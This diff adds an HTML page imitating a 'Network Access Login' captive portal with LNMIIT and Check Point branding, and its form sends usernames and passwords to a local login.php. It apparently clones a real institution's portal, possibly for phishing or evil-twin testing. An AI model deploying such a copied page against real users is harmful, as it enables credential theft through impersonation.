@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Network Access Login</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <img src="cp_logo_0.png" alt="LNMIIT Logo">
+        </div>
+        <h2>Network Access Login</h2>
+        <p>In order to connect to the network, please enter your credentials</p>
+        
+        <!-- Form now points to login.php -->
+        <form action="login.php" method="POST">
+            <label for="username">Username</label>
+            <input type="text" id="username" name="username" required>
+            <label for="password">Password</label>
+            <input type="password" id="password" name="password" required>
+            <button type="submit">Log In</button>
+        </form>
+        
+        <div class="footer">
+            <img src="cpnewlogo_1.png" alt="Check Point">
+        </div>
+    </div>
+</body>
+</html>
